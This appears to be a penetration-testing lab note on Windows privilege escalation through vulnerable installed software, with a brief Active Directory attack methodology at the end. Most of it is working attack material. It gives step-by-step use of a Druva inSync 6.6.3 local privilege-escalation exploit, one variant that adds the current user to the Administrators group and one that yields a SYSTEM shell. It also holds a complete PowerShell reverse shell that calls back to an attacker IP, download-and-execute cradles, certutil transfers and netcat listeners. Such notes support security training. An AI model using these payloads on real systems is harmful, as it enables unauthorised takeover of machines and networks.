#### <span style="color:rgb(11, 142, 224)">Vulnerable Software</span>

enumerate what all software's is installed : 
```
wmic product get name,version,vendor
```
then we will search for exploits of those versions on searchsploit/explpotDB or GitHub or other websites

dont look for normal softwares like aws , amazon , visual c++
look for 3rd party ex . "VNC Server 6.8.0" ; "Druva inSync 6.6.3"

sample 2 methods for <span style="color:rgb(11, 142, 224)">Druva inSync 6.6.3</span> : 

###### <span style="color:rgb(11, 142, 224)">Method 1 - Add yourself to Administrators group :</span>

exploit : https://github.com/yevh/CVE-2020-5752-Druva-inSync-Windows-Client-6.6.3---Local-Privilege-Escalation-PowerShell-/blob/main/DruvaPE.ps1
we download the script : DruvaPE.ps1 

we edit the file 
```
gedit DruvaPE.ps1 
```
in the $cmd= value 
we enter what we want it to execute 

so we replace : 
```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://192.168.163.199:8080/shell.ps1')"
```
with : 
```
$cmd = "net localgroup Administrators thm-unpriv /add"
```
we add our current user name "thm-unpriv" in the administrators group
also , we comment out the last line because we don't want it to be executed

save and exit
start python server on kali : 
```
python3 -m http.server 8000
```
download the main exploit on windows 
```cmd
certutil -f -urlcache http://192.168.163.199:8000/DruvaPE.ps1 DruvaPE.ps1
```
Start listener on Kali:
```bash
rlwrap -f . nc -lvnp 4444
```
now open powershell
```
powershell
```
import in powershell
```
Import-Module .\DruvaPE.ps1
```
so we got added to administrators group now 
we are administrators now 

###### <span style="color:rgb(11, 142, 224)">Method 2 - Reverse shell : </span>

we replace the value with our "powershell reverse shell"
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

Exploit Script : 
replace the kali ip here 
Use single quotes for the outer PowerShell string and keep the inner command in double quotes:
```
$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.163.199:8000/mypowershell.ps1'')"'
```

with your reverse shell looking like:
Payload script : 
replace the kali ip here 
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.163.199",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
you should get a shell on your Netcat listener on port 4444

so we now edit the exploit : 
```
gedit DruvaPE.ps1
```
paste the PowerShell reverse shell in the required place 
also , we comment out the last line because we don't want it to be executed

now we make the payload which it will take up from our kali 
```
gedit mypowershell.ps1
```
and paste reverse shell there and save and exit

now we transfer exploit it to windows 
start python server on kali : 
```
python3 -m http.server 8000
```
download the main exploit on windows 
```cmd
certutil -f -urlcache http://192.168.163.199:8000/DruvaPE.ps1 DruvaPE.ps1
```
Start listener on Kali:
```bash
rlwrap -f . nc -lvnp 4444
```
now open powershell
```
powershell
```
import in powershell
```
Import-Module .\DruvaPE.ps1
```
we get a reverse shel back as nt authority\system 

# <span style="color:rgb(11, 142, 224)">Active Directory</span>

#### <span style="color:rgb(11, 142, 224)">Methodology : </span>

AD -> use nxc to find shares, winrm, rdp rights. Get a foothold and set up ligolo. Run bloodhound, check for any outgoing rights, kerberoast, asrep roast, look for sus files that may contain credentials. If nothing, try windows priv esc, if nothing look at other services, maybe a FTP, MSSQL, MySQL or something and see if theres any low hanging fruits. Rinse and repeat till youre DC.

**Tools in my GOAT list**
1. Ligolo-ng for pivoting and port forwarding, super good
2. nxc >>> crackmapexec. The wiki is super good, I reckon you could do 90% of boxes if you use nxc well.
3. bloodhound -> so useful for AD, cant do anything without it

